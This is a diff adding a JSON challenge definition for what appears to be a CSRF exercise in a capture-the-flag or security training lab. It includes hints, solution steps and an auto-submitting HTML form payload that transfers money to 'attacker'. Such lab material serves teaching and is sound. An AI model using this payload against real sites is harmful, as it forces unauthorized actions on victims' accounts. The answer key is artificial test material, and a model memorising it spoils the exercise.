@@ -1,0 +1,24 @@
+{
+  "name": "CSRF (Cross-Site Request Forgery)",
+  "description": "Exploit CSRF vulnerability to perform unauthorized actions",
+  "difficulty": "medium",
+  "points": 50,
+  "route": "/csrf",
+  "solution": {
+    "explanation": "Exploit the CSRF vulnerability to perform an unauthorized action on behalf of an authenticated user.",
+    "steps": [
+      "Navigate to /csrf and observe the transfer form",
+      "Notice there's no CSRF token validation",
+      "Create an HTML page with a malicious form that auto-submits",
+      "Trick an authenticated user into visiting your page",
+      "The transfer will execute without user consent",
+      "Capture the flag from the response"
+    ],
+    "payload": "<form action='http://target/csrf/transfer' method='POST'><input name='amount' value='1000'/><input name='to' value='attacker'/></form><script>document.forms[0].submit();</script>",
+    "hints": [
+      "CSRF attacks exploit the trust a website has in a user's browser",
+      "Look for state-changing operations without CSRF protection",
+      "The form submission doesn't validate the request origin"
+    ]
+  }
+}
